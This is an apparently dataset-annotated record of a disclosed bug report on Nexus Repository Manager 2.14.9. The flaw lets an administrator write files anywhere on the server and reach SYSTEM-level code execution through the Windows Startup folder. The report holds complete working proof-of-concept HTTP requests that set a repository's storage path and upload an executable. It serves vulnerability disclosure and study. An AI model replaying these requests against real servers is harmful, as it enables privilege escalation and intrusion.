{
    "reported_to": "Central Security Project",
    "reported_by": "hland ",
    "title": "Unrestricted File Upload Leading to Remote Code Execution",
    "content": "\nDescription\nAs an administrator user it is possible to create files and directories in any location on the file system of the server. This can be abused to write files to any sensitive location on the Windows file system because the Nexus process runs with SYSTEM privileges. This can allows an attacker that is able to break into the Nexus Repository Manager to elevate privileges to SYSTEM on the server and use it as pivoting point for lateral movement during an attack.\nIn the proof-of-concept I upload a PE executable file to the user's Windows Startup Folder, achieving remote code execution the next time the user logs in. In my example simply executing calc.exe.\nThe tests were done with an installation of Nexus Repository Manager OSS 2.14.9-01 on Microsoft Windows Server 2016 Datacenter 10.0.14393 N/A Build 1439.\nAdditional Details\nUnfortunately I was unable to dig up the functions handling these HTTP requests.\nSteps to reproduce:\nCreate a repo and set the \"overrideLocalStorageUrl\" to a folder two levels below the one you want to write files to.\nPOST /nexus/service/local/repositories\nUpload a file to a directory of your choice by manipulating the \"g\", \"a\" and \"v\" parameters\nPOST /nexus/service/local/artifact/maven/content\nProof-Of-Concept\nCreate repository:\nCode 1.65 KiB\n1POST /nexus/service/local/repositories HTTP/1.1\n2Host: nexus-host\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0\n4Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json\n5X-Nexus-UI: true\n6Content-Length: 443\n7Connection: close\n8Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770\n9\n10{\"data\":{\"repoType\":\"hosted\",\"id\":\"5000\",\"name\":\"MyTestRepo\",\"writePolicy\":\"ALLOW_WRITE_ONCE\",\"browseable\":true,\"indexable\":true,\"exposed\":true,\"notFoundCacheTTL\":1440,\"repoPolicy\":\"RELEASE\",\"provider\":\"maven2\",\"providerRole\":\"org.sonatype.nexus.proxy.repository.Repository\",\"overrideLocalStorageUrl\":\"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu\",\"downloadRemoteIndexes\":false,\"checksumPolicy\":\"IGNORE\"}}\n11\n12HTTP/1.1 201 Created\n13Date: Wed, 28 Aug 2019 16:58:53 GMT\n14X-Frame-Options: SAMEORIGIN\n15X-Content-Type-Options: nosniff\n16Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8\n17Content-Type: application/json; charset=UTF-8\n18Content-Length: 638\n19Connection: close\n20\n21{\"data\":{\"contentResourceURI\":\"http://<redacted>/nexus/content/repositories/5000\",\"id\":\"5000\",\"name\":\"MyTestRepo\",\"provider\":\"maven2\",\"providerRole\":\"org.sonatype.nexus.proxy.repository.Repository\",\"format\":\"maven2\",\"repoType\":\"hosted\",\"exposed\":true,\"writePolicy\":\"ALLOW_WRITE_ONCE\",\"browseable\":true,\"indexable\":true,\"notFoundCacheTTL\":1440,\"repoPolicy\":\"RELEASE\",\"downloadRemoteIndexes\":false,\"overrideLocalStorageUrl\":\"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu\",\"defaultLocalStorageUrl\":\"file:/C:/Users/myuser/Desktop/nexus-2.14.9-01-bundle/sonatype-work/nexus/storage/5000\"}}\nUpload file\nCode 1.82 KiB\n1POST /nexus/service/local/artifact/maven/content HTTP/1.1\n2Host: nexus-host\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Content-Type: multipart/form-data; boundary=---------------------------103850373015325909411337083269\n8Content-Length: 33250\n9Connection: close\n10Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770\n11Upgrade-Insecure-Requests: 1\n12\n13-----------------------------103850373015325909411337083269\n14Content-Disposition: form-data; name=\"r\"\n15\n165000\n17-----------------------------103850373015325909411337083269\n18Content-Disposition: form-data; name=\"g\"\n19\n20Programs\n21-----------------------------103850373015325909411337083269\n22Content-Disposition: form-data; name=\"a\"\n23\n24Startup\n25-----------------------------103850373015325909411337083269\n26Content-Disposition: form-data; name=\"v\"\n27\n28.\n29-----------------------------103850373015325909411337083269\n30Content-Disposition: form-data; name=\"p\"\n31\n32jar\n33-----------------------------103850373015325909411337083269\n34Content-Disposition: form-data; name=\"c\"\n35\n36\n37-----------------------------103850373015325909411337083269\n38Content-Disposition: form-data; name=\"e\"\n39\n40exe\n41-----------------------------103850373015325909411337083269\n42Content-Disposition: form-data; name=\"file\"; filename=\"calc.exe\"\n43Content-Type: text/html\n44\n45<insert_content_of_calc.exe>\n46-----------------------------103850373015325909411337083269--\n47\n48\n49HTTP/1.1 201 Created\n50Date: Wed, 28 Aug 2019 17:05:47 GMT\n51X-Frame-Options: SAMEORIGIN\n52X-Content-Type-Options: nosniff\n53Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8\n54Content-Type: text/html;charset=UTF-8\n55Content-Length: 77\n56Connection: close\n57\n58{\"groupId\":\"Programs\",\"artifactId\":\"Startup\",\"version\":\".\",\"packaging\":\"jar\"}\nPatch\nThere are multiple ways to fix this:\nMake it the default to run Nexus Repository Manager as a less privileged user.\nRestrict the locations on the filesystem that Nexus Repository Manager can write to.\nAdditional details\nOS Name: Microsoft Windows Server 2016 Datacenter\nOS Version: 10.0.14393 N/A Build 14393\njava version \"1.8.0_211\"\nJava(TM) SE Runtime Environment (build 1.8.0_211-b12)\nJava HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode)\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nMy reaction when uploading files to any location on the filesystem:\nhttps://66.media.tumblr.com/463873f43d1b6c3ae34ab817fe92e0a2/tumblr_inline_omgbhw31qa1qar3or_500.gif\nImpact\nThe attacker could run arbitrary code on the server as the SYSTEM user.\n\n",
    "severity": [
        9.1,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Business Logic Errors"
    ],
    "screenshots": {},
    "disclosed_date": 1572480300,
    "report_url": "https://hackerone.com/reports/683965",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Create a repository with the 'overrideLocalStorageUrl' parameter set to a target directory path (e.g., Windows Startup folder)."
        ],
        [
            2,
            "Upload a malicious executable file (e.g., calc.exe) by manipulating the 'g', 'a', and 'v' parameters in the upload request to place the file in the desired location."
        ]
    ],
    "vuln_description": "An unrestricted file upload vulnerability in Nexus Repository Manager allows an administrator to write files to arbitrary locations on the server's filesystem, including sensitive directories. Since the Nexus process runs with SYSTEM privileges, this can lead to remote code execution (RCE) by placing a malicious executable in a location like the Windows Startup folder.",
    "reason": "The vulnerability involves manipulating repository configuration and file upload parameters to achieve arbitrary file write, but the steps are straightforward once the parameter manipulation is understood. The attack does not require complex interactions or novel logic.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}